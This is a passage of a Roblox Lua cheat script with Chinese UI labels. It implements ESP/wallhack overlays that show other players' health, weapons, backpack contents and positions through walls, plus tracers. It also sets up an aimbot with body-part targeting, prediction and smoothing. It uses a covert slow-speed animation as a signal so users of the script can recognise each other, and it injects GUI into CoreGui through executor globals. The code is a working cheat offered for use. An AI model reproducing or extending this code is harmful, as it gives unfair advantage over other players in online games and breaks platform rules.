                            hasESP = true
                            break
                        end
                    end
                    
                    if not hasESP then
                        CreateESP(player.Character, player)
                    end
                end
            end
        end
        
        if not _G.ESPConfig.Enabled then 
            for character, esp in pairs(ESPCache) do
                if esp.Highlight then 
                    esp.Highlight.Enabled = false 
                end
                if esp.Billboard then 
                    esp.Billboard.Enabled = false 
                end
            end
            _G.TracerModule.CleanupTracers()
            return 
        end
        
        for character, esp in pairs(ESPCache) do
            if not character or not character.Parent then
                CleanupESP(character)
                continue
            end
            
            if not _G.ESPUtils.shouldShowESP(esp.Player, character) then
                if esp.Highlight then 
                    esp.Highlight.Enabled = false 
                end
                if esp.Billboard then 
                    esp.Billboard.Enabled = false 
                end
                continue
            end
            
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then continue end
            
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid then continue end
            
            if esp.Billboard and not esp.Billboard.Adornee then
                esp.Billboard.Adornee = humanoidRootPart
            end
            
            local distance = (humanoidRootPart.Position - Camera.CFrame.Position).Magnitude
            local visibility = _G.ColorCalculator.CalculateVisibility(distance, _G.ESPConfig.MaxDistance)
            
            if visibility <= 0 then
                if esp.Highlight then 
                    esp.Highlight.Enabled = false 
                end
                if esp.Billboard then 
                    esp.Billboard.Enabled = false 
                end
                continue
            end
            
            local color = _G.ColorCalculator.CalculatePlayerColor(esp, humanoid, character, distance)
            local alphaMultiplier = _G.ESPConfig.UseDistanceFade and visibility or 1
            local isBehindWall = _G.WallCheck.IsBehindWall(character)
            
            if esp.Highlight then
                esp.Highlight.FillColor = color
                esp.Highlight.OutlineColor = Color3.new(0, 0, 0)
                esp.Highlight.FillTransparency = _G.ESPConfig.FillTransparency + (0.3 * (1 - alphaMultiplier))
                
                if _G.ESPConfig.BoxOutlineEnabled then
                    esp.Highlight.OutlineTransparency = _G.ESPConfig.OutlineTransparency + (0.3 * (1 - alphaMultiplier))
                else
                    esp.Highlight.OutlineTransparency = 1
                end
                
                if _G.ESPConfig.WallCheck and _G.WallCheck.isWallBetween(character) then
                    if _G.ESPConfig.WallhackEnabled then
                        esp.Highlight.Enabled = true
                        esp.Highlight.FillTransparency = 0.8
                    else
                        esp.Highlight.Enabled = false
                    end
                else
                    esp.Highlight.Enabled = _G.ESPConfig.HighlightEnabled
                end
            end
            
            local textLabel = esp.Billboard and esp.Billboard:FindFirstChildOfClass("TextLabel")
            if textLabel then
                local textParts = {}
                
                if _G.ESPConfig.ShowName then
                    table.insert(textParts, esp.Player.Name)
                end
                
                if _G.ESPConfig.ShowHealth then
                    table.insert(textParts, string.format("HP: %d/%d", math.floor(humanoid.Health), math.floor(humanoid.MaxHealth)))
                end
                
                if _G.ESPConfig.ShowDistance then
                    table.insert(textParts, string.format("%dm", math.floor(distance)))
                end
                
                if _G.ESPConfig.ShowWeapon then
                    table.insert(textParts, _G.ESPUtils.GetPlayerWeapon(character))
                end
                
                if _G.ESPConfig.ShowBackpack then
                    local backpackWeapons = _G.ESPUtils.GetPlayerBackpackWeapons(esp.Player)
                    if backpackWeapons ~= "无武器" then
                        table.insert(textParts, "背包: " .. backpackWeapons)
                    end
                end
                
                if _G.ESPConfig.ShowTeam then
                    local isTeammate = _G.ESPUtils.IsTeammate(esp.Player)
                    if isTeammate then
                        table.insert(textParts, "队友")
                    else
                        table.insert(textParts, "敌人")
                    end
                end
                
                if _G.ESPConfig.FriendCheck and _G.ESPUtils.isFriend(esp.Player) then
                    table.insert(textParts, "[好友]")
                end
                
                if isBehindWall and _G.ESPConfig.WallhackEnabled then
                    table.insert(textParts, "[墙后]")
                end
                
                textLabel.Text = table.concat(textParts, " | ")
                textLabel.TextColor3 = color
                textLabel.TextTransparency = _G.ESPConfig.UseDistanceFade and (0.3 * (1 - alphaMultiplier)) or 0
                textLabel.TextSize = _G.ESPConfig.TextSize * (_G.ESPConfig.DistanceScale and math.clamp(1.5 - (distance / 1000) * 0.5, 0.8, 1.5) or 1) * _G.ESPConfig.NameTagSize
                
                if _G.ESPConfig.WallCheck and _G.WallCheck.isWallBetween(character) then
                    if esp.Billboard then
                        esp.Billboard.Enabled = _G.ESPConfig.WallhackEnabled
                    end
                else
                    if esp.Billboard then
                        esp.Billboard.Enabled = #textParts > 0
                    end
                end
            end
            
            if esp.HealthBar then
                local healthPercent = humanoid.Health / humanoid.MaxHealth
                esp.HealthBar.Size = UDim2.new(healthPercent, 0, 1, 0)
                esp.HealthBar.BackgroundColor3 = color
            end
            
            if _G.ESPConfig.ShowTracer then
                _G.TracerModule.UpdateTracer(esp.Player)
            end
        end
    end
    
    local function RecreateAllESP()
        for character, esp in pairs(ESPCache) do
            CleanupESP(character)
        end
        _G.TracerModule.CleanupTracers()
        
        if _G.ESPConfig.Enabled then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    CreateESP(player.Character, player)
                end
            end
        end
        UpdateESP()
    end
    
    local function InitializePlayerESP(player)
        if player == LocalPlayer then return end
        
        if PlayerConnections[player] then
            for _, conn in pairs(PlayerConnections[player]) do
                pcall(function() conn:Disconnect() end)
            end
        end
        
        PlayerConnections[player] = {}
        
        local function OnCharacterAdded(character)
            task.wait(0.5)
            
            if _G.ESPConfig.Enabled and player ~= LocalPlayer then
                local exists = false
                for char, _ in pairs(ESPCache) do
                    if char == character then
                        exists = true
                        break
                    end
                end
                
                if not exists then
                    task.spawn(function()
                        CreateESP(character, player)
                    end)
                end
            end
        end
        
        local function OnCharacterRemoving(character)
            CleanupESP(character)
        end
        
        if player.Character then
            task.spawn(function()
                OnCharacterAdded(player.Character)
            end)
        end
        
        PlayerConnections[player].CharacterAdded = player.CharacterAdded:Connect(OnCharacterAdded)
        PlayerConnections[player].CharacterRemoving = player.CharacterRemoving:Connect(OnCharacterRemoving)
    end
    
    RunService.Heartbeat:Connect(function()
        if not LocalPlayer.Character then return end
        pcall(UpdateESP)
    end)
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            InitializePlayerESP(player)
        end
    end
    
    Players.PlayerAdded:Connect(InitializePlayerESP)
    
    Players.PlayerRemoving:Connect(function(player)
        if PlayerConnections[player] then
            for _, conn in pairs(PlayerConnections[player]) do
                pcall(function() conn:Disconnect() end)
            end
            PlayerConnections[player] = nil
        end
        
        for character, esp in pairs(ESPCache) do
            if esp.Player == player then
                CleanupESP(character)
            end
        end
        
        _G.TracerModule.RemoveTracer(player)
    end)
    
    _G.ESPCore = {
        RecreateAllESP = RecreateAllESP,
        UpdateESP = UpdateESP,
        ESPCache = ESPCache
    }
end)

run(function()
    local colorNames = _G.GetColorNames()
    
    local function SetupUI()
        Feng:Toggle("ESP总开关", "esp_toggle", false, function(state)
            _G.ESPConfig.Enabled = state
            if state then
                _G.ESPCore.RecreateAllESP()
            else
                for character, esp in pairs(_G.ESPCore.ESPCache) do
                    if esp.Highlight then 
                        pcall(function() esp.Highlight:Destroy() end)
                    end
                    if esp.Billboard then 
                        pcall(function() esp.Billboard:Destroy() end)
                    end
                end
                _G.ESPCore.ESPCache = {}
                _G.TracerModule.CleanupTracers()
            end
        end)
        
        Feng:Toggle("显示高亮", "esp_highlight", false, function(state)
            _G.ESPConfig.HighlightEnabled = state
            for _, esp in pairs(_G.ESPCore.ESPCache) do
                if esp.Highlight then
                    esp.Highlight.Enabled = state and _G.ESPConfig.Enabled
                end
            end
        end)
        
        Feng:Toggle("方框描边", "ESPBoxOutline", false, function(state)
            _G.ESPConfig.BoxOutlineEnabled = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示玩家名字", "esp_show_name", false, function(state)
            _G.ESPConfig.ShowName = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示血量", "esp_show_health", false, function(state)
            _G.ESPConfig.ShowHealth = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示距离", "esp_show_distance", false, function(state)
            _G.ESPConfig.ShowDistance = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示武器", "esp_show_weapon", false, function(state)
            _G.ESPConfig.ShowWeapon = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示背包", "esp_show_backpack", false, function(state)
            _G.ESPConfig.ShowBackpack = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示队伍", "esp_show_team", false, function(state)
            _G.ESPConfig.ShowTeam = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("显示天线", "esp_show_tracer", false, function(state)
            _G.ESPConfig.ShowTracer = state
            if not state then
                _G.TracerModule.CleanupTracers()
            else
                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game:GetService("Players").LocalPlayer then
                        _G.TracerModule.CreateTracer(player)
                    end
                end
            end
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Dropdown("天线射出点", "esp_tracer_origin", {"屏幕", "身体", "头部"}, function(selected)
            _G.ESPConfig.TracerOrigin = selected
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Slider("天线粗细", "esp_tracer_thickness", 3, 1, 10, false, function(value)
            _G.ESPConfig.TracerThickness = value
            _G.TracerModule.UpdateAllTracerThickness()
        end)
        
        Feng:Slider("天线透明度", "esp_tracer_transparency", 0.5, 0, 1, true, function(value)
            _G.ESPConfig.TracerTransparency = value
            _G.TracerModule.UpdateAllTracerTransparency()
        end)
        
        Feng:Dropdown("颜色模式", "esp_color_mode", {
            "队伍_红", "队伍_绿", "队伍_蓝",
            "血量", "彩虹", "距离", "墙后",
            "红", "绿", "蓝", "黄", "紫", "白", "黑", "橙", "青", "粉", "青绿", "金色", "银色"
        }, function(selected)
            _G.ESPConfig.ColorMode = selected
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("墙壁检测", "esp_wall_check", false, function(state)
            _G.ESPConfig.WallCheck = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("活体检测", "esp_alive_check", false, function(state)
            _G.ESPConfig.AliveCheck = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("好友检测", "esp_friend_check", false, function(state)
            _G.ESPConfig.FriendCheck = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("穿墙显示", "esp_wallhack", false, function(state)
            _G.ESPConfig.WallhackEnabled = state
            _G.ESPCore.UpdateESP()
        end)
        
        Feng:Toggle("血量条显示", "esp_health_bar", false, function(state)
            _G.ESPConfig.HealthBarEnabled = state
            _G.ESPCore.RecreateAllESP()
        end)
        
        Feng:Toggle("距离缩放", "esp_distance_scale", false, function(state)
            _G.ESPConfig.DistanceScale = state
            _G.ESPCore.UpdateESP()
        end)
    end
    
    if Feng then
        SetupUI()
    else
        task.spawn(function()
            local maxWait = 10
            local waited = 0
            while waited < maxWait and not Feng do
                task.wait(1)
                waited = waited + 1
            end
            if Feng then
                SetupUI()
            end
        end)
    end
end)

local about = PIJIAOBEN:section("透视脚本用户", false)

local run = function(func) func() end

run(function()
    _G.PiESPConfig = {
        enabled = false,
        animationId = "rbxassetid://507770239",
        scanInterval = 1,
        animSpeed = 0.0112,
        espData = {
            trackers = {},
            connections = {},
            playersToTrack = {}
        }
    }
end)

run(function()
    _G.PiESPServices = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        CoreGui = game:GetService("CoreGui"),
        LocalPlayer = game:GetService("Players").LocalPlayer
    }
end)

run(function()
    local Players = _G.PiESPServices.Players
    local RunService = _G.PiESPServices.RunService
    local CoreGui = _G.PiESPServices.CoreGui
    local LocalPlayer = _G.PiESPServices.LocalPlayer
    local config = _G.PiESPConfig
    local espData = config.espData
    
    local espEnabled = false
    local animPlaying = false
    local animTrack = nil
    
    genv = getgenv()
    genv.PiScriptUsers = genv.PiScriptUsers or {}
    
    local ANIMATION_ID = config.animationId
    local ANIM_SPEED = config.animSpeed
    
    local function startSecretAnimation()
        if animPlaying then return end
        
        local char = LocalPlayer.Character
        if not char then
            LocalPlayer.CharacterAdded:Wait()
            char = LocalPlayer.Character
        end
        
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        
        local animator = humanoid:FindFirstChildOfClass("Animator")
        if not animator then return end
        
        local animation = Instance.new("Animation")
        animation.AnimationId = ANIMATION_ID
        animTrack = animator:LoadAnimation(animation)
        animTrack:Play(0, 0.001, ANIM_SPEED)
        animPlaying = true
        genv.PiTrack = animTrack
    end
    
    local function cleanESP()
        for _, tracker in pairs(espData.trackers) do
            if tracker.billboard then tracker.billboard:Destroy() end
            if tracker.highlight then tracker.highlight:Destroy() end
            if tracker.connection then tracker.connection:Disconnect() end
            if tracker.heartbeat then tracker.heartbeat:Disconnect() end
        end
        
        for _, conn in pairs(espData.connections) do
            if conn then conn:Disconnect() end
        end
        
        espData.trackers = {}
        espData.connections = {}
        espData.playersToTrack = {}
    end
    
    local function getRootPart(character)
        return character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChildWhichIsA("BasePart"))
    end
    
    local function getHealth(character)
        local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
        if humanoid and humanoid.Health > 0 then
            return math.floor(humanoid.Health)
        end
        return 0
    end
    
    local function getDistance(character)
        local localChar = LocalPlayer.Character
        local localRoot = getRootPart(localChar)
        local targetRoot = getRootPart(character)
        if localRoot and targetRoot then
            return math.floor((localRoot.Position - targetRoot.Position).Magnitude)
        end
        return 0
    end
    
    local function isPlayingSecretAnimation(character)
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
        if not animator then return false end
        
        local found = false
        pcall(function()
            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
                if track.Animation and track.Animation.AnimationId == ANIMATION_ID then
                    if track.Speed > 0.0111 and track.Speed < 0.0113 then
                        found = true
                        break
                    end
                end
            end
        end)
        return found
    end
    
    local function createESP(character, player)
        if not character or not character.Parent then return end
        if player == LocalPlayer then return end
        if not espEnabled then return end
        
        if not table.find(genv.PiScriptUsers, player.UserId) then
            return
        end
        
        local frame = Instance.new("Frame")
        frame.BackgroundTransparency = 1
        frame.Size = UDim2.new(1, 0, 1, 0)
        
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Name = "NameLabel"
        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
        nameLabel.Position = UDim2.new(0, 0, 0, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.TextColor3 = Color3.new(1, 1, 1)
        nameLabel.TextSize = 14
        nameLabel.Font = Enum.Font.SourceSansBold
        nameLabel.Text = "皮脚本用户[" .. player.Name .. "]"
        nameLabel.TextYAlignment = Enum.TextYAlignment.Bottom
        nameLabel.Parent = frame
        
        local infoLabel = Instance.new("TextLabel")
        infoLabel.Name = "InfoLabel"
        infoLabel.Size = UDim2.new(1, 0, 0.5, 0)
        infoLabel.Position = UDim2.new(0, 0, 0.5, 0)
        infoLabel.BackgroundTransparency = 1
        infoLabel.TextColor3 = Color3.new(1, 1, 1)
        infoLabel.TextSize = 12
        infoLabel.Font = Enum.Font.SourceSans
        infoLabel.Text = string.format("[%d/%d]", getDistance(character), getHealth(character))
        infoLabel.TextYAlignment = Enum.TextYAlignment.Top
        infoLabel.Parent = frame
        
        local bill = Instance.new("BillboardGui")
        bill.Name = "PiScriptESP"
        bill.AlwaysOnTop = true
        bill.Size = UDim2.new(4, 0, 4, 0)
        bill.Adornee = character
        bill.MaxDistance = 1000
        bill.Parent = CoreGui
        frame.Parent = bill
        
        local highlight = Instance.new("Highlight")
        highlight.Name = "PiScriptESP_Highlight"
        highlight.Adornee = character
        highlight.FillColor = Color3.new(1, 1, 1)
        highlight.FillTransparency = 0.5
        highlight.OutlineColor = Color3.new(1, 1, 1)
        highlight.OutlineTransparency = 0.2
        highlight.Parent = CoreGui
        
        local function updateDisplay()
            if not espEnabled or not character.Parent then return end
            
            local distance = getDistance(character)
            local health = getHealth(character)
            infoLabel.Text = string.format("[%d/%d]", distance, health)
        end
        
        local tracker = {
            model = character,
            player = player,
            billboard = bill,
            highlight = highlight,
            connection = character.AncestryChanged:Connect(function(_, parent)
                if parent == nil then
                    if bill.Parent then bill:Destroy() end
                    if highlight.Parent then highlight:Destroy() end
                end
            end),
            heartbeat = RunService.Heartbeat:Connect(updateDisplay)
        }
        
        updateDisplay()
        table.insert(espData.trackers, tracker)
        return tracker
    end
    
    local function removeESP(player)
        for i, tracker in pairs(espData.trackers) do
            if tracker.player == player then
                if tracker.billboard then tracker.billboard:Destroy() end
                if tracker.highlight then tracker.highlight:Destroy() end
                if tracker.connection then tracker.connection:Disconnect() end
                if tracker.heartbeat then tracker.heartbeat:Disconnect() end
                table.remove(espData.trackers, i)
                break
            end
        end
    end
    
    local function refreshAllESP()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and table.find(genv.PiScriptUsers, player.UserId) then
                removeESP(player)
                if player.Character then
                    createESP(player.Character, player)
                end
            end
        end
    end
    
    local function scanAndAddUsers()
        for _, player in pairs(Players:GetPlayers()) do
            if player == LocalPlayer then continue end
            if not player.Character then continue end
            
            if isPlayingSecretAnimation(player.Character) then
                if not table.find(genv.PiScriptUsers, player.UserId) then
                    table.insert(genv.PiScriptUsers, player.UserId)
                    if espEnabled then
                        createESP(player.Character, player)
                    end
                end
            end
        end
    end
    
    local function monitorPlayers()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                if table.find(genv.PiScriptUsers, player.UserId) and player.Character then
                    createESP(player.Character, player)
                end
                
                local charConn = player.CharacterAdded:Connect(function(character)
                    if table.find(genv.PiScriptUsers, player.UserId) then
                        removeESP(player)
                        createESP(character, player)
                    end
                end)
                table.insert(espData.connections, charConn)
            end
        end
        
        local playerConn = Players.PlayerAdded:Connect(function(player)
            if player == LocalPlayer then return end
            
            local charConn = player.CharacterAdded:Connect(function(character)
                if table.find(genv.PiScriptUsers, player.UserId) then
                    createESP(character, player)
                end
            end)
            table.insert(espData.connections, charConn)
            
            if player.Character and table.find(genv.PiScriptUsers, player.UserId) then
                createESP(player.Character, player)
            end
        end)
        table.insert(espData.connections, playerConn)
        
        local leaveConn = Players.PlayerRemoving:Connect(function(player)
            removeESP(player)
        end)
        table.insert(espData.connections, leaveConn)
        
        local scanConn = RunService.Heartbeat:Connect(function()
            scanAndAddUsers()
        end)
        table.insert(espData.connections, scanConn)
    end
    
    _G.PiESPModule = {
        enable = function()
            espEnabled = true
            config.enabled = true
            cleanESP()
            monitorPlayers()
            scanAndAddUsers()
            refreshAllESP()
        end,
        disable = function()
            espEnabled = false
            config.enabled = false
            cleanESP()
            genv.PiScriptUsers = {}
        end,
        isEnabled = function()
            return espEnabled
        end,
        startAnimation = startSecretAnimation
    }
end)

run(function()
    local module = _G.PiESPModule
    
    module.startAnimation()
    
    about:Toggle("皮脚本用户透视", "", false, function(state)
        if state then
            module.enable()
        else
            module.disable()
        end
    end)
end)

run(function()
    local LocalPlayer = _G.PiESPServices.LocalPlayer
    local config = _G.PiESPConfig
    local animPlaying = false
    
    local function startAnimation(char)
        if animPlaying then return end
        
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
        if animator then
            local animation = Instance.new("Animation")
            animation.AnimationId = config.animationId
            local track = animator:LoadAnimation(animation)
            track:Play(0, 0.001, config.animSpeed)
            animPlaying = true
            getgenv().PiTrack = track
        end
    end
    
    local char = LocalPlayer.Character
    if char then
        startAnimation(char)
    end
    
    LocalPlayer.CharacterAdded:Connect(function(character)
        task.wait(0.5)
        animPlaying = false
        startAnimation(character)
    end)
end)

local PIJIAOBEN = XIAOPI:Tab("自瞄","136169594232359")

local run = function(func) func() end

run(function()
    local AimBot = {
        enabled = false,
        distance = 40,
        position = "Head",
        teamCheck = false,
        wallCheck = false,
        aliveCheck = false,
        friendCheck = false, 
        predictionEnabled = false,
        predictionDistance = 0,
        smoothnessEnabled = false,
        smoothness = 50,
        priority = "fov",
        offsetEnabled = false,
        offsetX = 0,
        offsetY = 0,
        disableOnMove = false,
        moveThreshold = 0.3,
        lockMode = "相机",
        aimNPC = false,
        fovLimit = {
            enabled = false,
            angle = 60
        }
    }
    
    local FOVCircle = {
        enabled = false,
        size = 20,
        color = Color3.fromRGB(255, 255, 255),
        thickness = 2,
        transparency = 1,
        defaultYOffset = -57.5,
        follow = "准心"
    }
    
    local TargetRay = {
        enabled = false,
        color = Color3.fromRGB(255, 0, 0),
        thickness = 2,
        transparency = 0.5,
        showDistance = false
    }
    
    local Crosshair = {
        enabled = false,
        style = "十字",
        color = Color3.fromRGB(255, 255, 255),
        size = 20,
        thickness = 2,
        transparency = 0,
        gap = 4,
        dotSize = 3,
        outline = false,
        outlineColor = Color3.fromRGB(0, 0, 0),
        outlineThickness = 1
    }
    
    local colorMap = {
        ["红色"] = Color3.fromRGB(255, 0, 0),
        ["蓝色"] = Color3.fromRGB(0, 0, 255),
        ["黄色"] = Color3.fromRGB(255, 255, 0),
        ["绿色"] = Color3.fromRGB(0, 255, 0),
        ["青色"] = Color3.fromRGB(0, 255, 255),
        ["橙色"] = Color3.fromRGB(255, 165, 0),
        ["紫色"] = Color3.fromRGB(128, 0, 128),
        ["白色"] = Color3.fromRGB(255, 255, 255),
        ["黑色"] = Color3.fromRGB(0, 0, 0),
        ["彩色"] = Color3.fromRGB(255, 0, 0)
    }
    
    local partMap = {
        ["头部"] = "Head",
        ["脖子"] = "HumanoidRootPart",
        ["躯干"] = "Torso",
        ["左臂"] = "Left Arm",
        ["右臂"] = "Right Arm",
        ["左腿"] = "Left Leg",
        ["右腿"] = "Right Leg",
        ["左手"] = "LeftHand",
        ["右手"] = "RightHand",
        ["左小臂"] = "LeftLowerArm",
        ["右小臂"] = "RightLowerArm",
        ["左大臂"] = "LeftUpperArm",
        ["右大臂"] = "RightUpperArm",
        ["左脚"] = "LeftFoot",
        ["左小腿"] = "LeftLowerLeg",
        ["上半身"] = "UpperTorso",
        ["左大腿"] = "LeftUpperLeg",
        ["右脚"] = "RightFoot",
        ["右小腿"] = "RightLowerLeg",
        ["下半身"] = "LowerTorso",
        ["右大腿"] = "RightUpperLeg"
    }
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local LocalPlayer = Players.LocalPlayer
    local Cam = workspace.CurrentCamera
    
    local fovGui = nil
    local fovCircle = nil
    local fovUpdateConnection = nil
    
    local targetLine = nil
    local distanceText = nil
    local targetRenderConnection = nil
    
    local crosshairGui = nil
    local crosshairElements = {}
    local crosshairUpdateConnection = nil
    local crosshairRainbowConnection = nil
    
    local playerPositions = {}
    local aimRenderConnection = nil
    local inputConnection = nil
    local mouseConnection = nil
    local mousePos = Vector2.new(0, 0)
    
    local quickGui = nil
    local quickButton = nil
    local aimToggleInstance = nil
    local rainbowConnection = nil
    local savedQuickPosition = UDim2.new(0, 10, 1, -55)
    
    local showQuickSwitch = false
    local lockQuickSwitch = false
    
    local VirtualInputManager = Instance.new("VirtualInputManager")
    local currentTarget = nil
    
    local isMobile = table.find({Enum.Platform.Android, Enum.Platform.IOS}, UserInputService:GetPlatform()) ~= nil
    
    local function isMoving()
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return false end
        
        local moveDirection = humanoid.MoveDirection
        return moveDirection.Magnitude > AimBot.moveThreshold
    end
    
    local function getRainbowColor()
        local hue = tick() % 5 / 5
        return Color3.fromHSV(hue, 1, 1)
    end
    
    local function getScreenCenterWithOffset()
        local center = Cam.ViewportSize / 2
        if AimBot.offsetEnabled then
            return Vector2.new(center.X + AimBot.offsetX, center.Y + AimBot.offsetY + FOVCircle.defaultYOffset)
        else
            return Vector2.new(center.X, center.Y + FOVCircle.defaultYOffset)
        end
    end
    
    local function getFOVCenter()
        if FOVCircle.follow == "鼠标" then
            return mousePos
        else
            return getScreenCenterWithOffset()
        end
    end
    
    local function createCrosshairElement()
        local element = Instance.new("Frame")
        element.BackgroundTransparency = 1
        element.BorderSizePixel = 0
        element.Parent = crosshairGui
        return element
    end
    
    local function createCrosshairLine(parent, size, thickness, color, transparency, position)
        local line = Instance.new("Frame", parent)
        line.BackgroundColor3 = color
        line.BackgroundTransparency = transparency / 100
        line.BorderSizePixel = 0
        if position == "vertical" then
            line.Size = UDim2.new(0, thickness, 0, size)
        else
            line.Size = UDim2.new(0, size, 0, thickness)
        end
        return line
    end
    
    local function createCrosshairDot(parent, size, color, transparency)
        local dot = Instance.new("Frame", parent)
        dot.BackgroundColor3 = color
        dot.BackgroundTransparency = transparency / 100
        dot.BorderSizePixel = 0
        dot.Size = UDim2.new(0, size, 0, size)
        local corner = Instance.new("UICorner", dot)
        corner.CornerRadius = UDim.new(1, 0)
        return dot
    end
    
    local function buildCrosshair()
        for _, element in ipairs(crosshairElements) do
            element:Destroy()
        end
        crosshairElements = {}
        
        if not Crosshair.enabled then return end
        
        local center = getScreenCenterWithOffset()
        local size = Crosshair.size
        local thickness = Crosshair.thickness
        local color = Crosshair.color
        local transparency = Crosshair.transparency
        local gap = Crosshair.gap
        local halfSize = size / 2
        local halfThick = thickness / 2
        
        local container = Instance.new("Frame")
        container.Name = "CrosshairContainer"
        container.Size = UDim2.new(0, size * 2 + thickness, 0, size * 2 + thickness)
        container.Position = UDim2.new(0, center.X - size - halfThick, 0, center.Y - size - halfThick)
        container.BackgroundTransparency = 1
        container.BorderSizePixel = 0
        container.Parent = crosshairGui
        table.insert(crosshairElements, container)
        
        local mainColor = color
        if color == colorMap["彩色"] then
            mainColor = getRainbowColor()
        end
        
        local function addElement(element)
            table.insert(crosshairElements, element)
            return element
        end
        
        if Crosshair.style == "十字" then
            local top = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "vertical")
            top.Position = UDim2.new(0.5, -halfThick, 0, 0)
            addElement(top)
            
            local bottom = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "vertical")
            bottom.Position = UDim2.new(0.5, -halfThick, 1, -(size - gap))
            addElement(bottom)
            
            local left = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "horizontal")
            left.Position = UDim2.new(0, 0, 0.5, -halfThick)
            addElement(left)
            
            local right = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "horizontal")
            right.Position = UDim2.new(1, -(size - gap), 0.5, -halfThick)
            addElement(right)
            
            local dot = createCrosshairDot(container, thickness * 1.5, mainColor, transparency)
            dot.Position = UDim2.new(0.5, -thickness * 0.75, 0.5, -thickness * 0.75)
            addElement(dot)
            
        elseif Crosshair.style == "红点" then
            local dotSize = Crosshair.dotSize
            local dot = createCrosshairDot(container, dotSize, mainColor, transparency)
            dot.Position = UDim2.new(0.5, -dotSize/2, 0.5, -dotSize/2)
            addElement(dot)
            
        elseif Crosshair.style == "圆圈" then
            local circle = Instance.new("Frame", container)
            circle.Size = UDim2.new(0, size, 0, size)
            circle.Position = UDim2.new(0.5, -size/2, 0.5, -size/2)
            circle.BackgroundTransparency = 1
            circle.BorderSizePixel = 0
            addElement(circle)
            
            local corner = Instance.new("UICorner", circle)
            corner.CornerRadius = UDim.new(1, 0)
            addElement(corner)
            
            local stroke = Instance.new("UIStroke", circle)
            stroke.Thickness = thickness
            stroke.Color = mainColor
            stroke.Transparency = transparency / 100
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            addElement(stroke)
            
            local dot = createCrosshairDot(container, thickness * 1.5, mainColor, transparency)
            dot.Position = UDim2.new(0.5, -thickness * 0.75, 0.5, -thickness * 0.75)
            addElement(dot)
            
        elseif Crosshair.style == "T型" then
            local top = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "vertical")
            top.Position = UDim2.new(0.5, -halfThick, 0, 0)
            addElement(top)
            
            local left = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "horizontal")
            left.Position = UDim2.new(0, 0, 0.5, -halfThick)
            addElement(left)
            
            local right = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "horizontal")
            right.Position = UDim2.new(1, -(size - gap), 0.5, -halfThick)
            addElement(right)
            
            local dot = createCrosshairDot(container, thickness * 1.5, mainColor, transparency)
            dot.Position = UDim2.new(0.5, -thickness * 0.75, 0.5, -thickness * 0.75)
            addElement(dot)
            
        elseif Crosshair.style == "X型" then
            local function createXLine(rotation)
                local line = Instance.new("Frame", container)
                line.Size = UDim2.new(0, size * 0.8, 0, thickness)
                line.Position = UDim2.new(0.5, -size * 0.4, 0.5, -thickness/2)
                line.BackgroundColor3 = mainColor
                line.BackgroundTransparency = transparency / 100
                line.BorderSizePixel = 0
                line.Rotation = rotation
                addElement(line)
                return line
            end
            
            createXLine(45)
            createXLine(-45)
            
            local dot = createCrosshairDot(container, thickness * 1.5, mainColor, transparency)
            dot.Position = UDim2.new(0.5, -thickness * 0.75, 0.5, -thickness * 0.75)
            addElement(dot)
            
        elseif Crosshair.style == "自定义" then
            local top = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "vertical")
            top.Position = UDim2.new(0.5, -halfThick, 0, 0)
            addElement(top)
            
            local bottom = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "vertical")
            bottom.Position = UDim2.new(0.5, -halfThick, 1, -(size - gap))
            addElement(bottom)
            
            local left = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "horizontal")
            left.Position = UDim2.new(0, 0, 0.5, -halfThick)
            addElement(left)
            
            local right = createCrosshairLine(container, size - gap, thickness, mainColor, transparency, "horizontal")
            right.Position = UDim2.new(1, -(size - gap), 0.5, -halfThick)
            addElement(right)
            
            local circle = Instance.new("Frame", container)
            circle.Size = UDim2.new(0, size * 0.7, 0, size * 0.7)
